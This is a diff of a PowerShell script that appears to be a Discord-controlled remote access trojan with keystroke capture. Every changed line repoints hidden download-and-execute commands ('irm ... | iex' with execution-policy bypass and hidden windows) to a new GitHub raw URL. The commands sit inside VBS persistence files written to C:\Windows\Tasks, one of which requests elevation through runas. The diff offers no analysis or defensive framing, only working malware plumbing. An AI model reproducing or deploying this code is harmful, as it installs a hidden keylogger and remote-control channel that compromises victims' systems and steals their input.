@@ -5,7 +5,7 @@ $chan = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($plac
 $HideWindow = 1
 $spawnChannels = 1
 $InfoOnConnect = 1
-$parent = "https://raw.githubusercontent.com/discorduser5326347/discordapplication315475346236315362/refs/heads/main/client.ps1"
+$parent = "https://raw.githubusercontent.com/discorduser5326347/AyxLTdoQfu/refs/heads/main/clientsafe.ps1"
 
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
     $InfoOnConnect = 0
@@ -959,7 +959,7 @@ Function KeyCapture {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/discordapplication315475346236315362/refs/heads/main/client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/AyxLTdoQfu/refs/heads/main/clientsafe.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
@@ -999,7 +999,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/discordapplication315475346236315362/refs/heads/main/client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/AyxLTdoQfu/refs/heads/main/clientsafe.ps1 | iex`", 0, True
 "@
     $pth = "C:\Windows\Tasks\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -1319,7 +1319,7 @@ Function VersionCheck {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/discordapplication315475346236315362/refs/heads/main/client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/discorduser5326347/AyxLTdoQfu/refs/heads/main/clientsafe.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
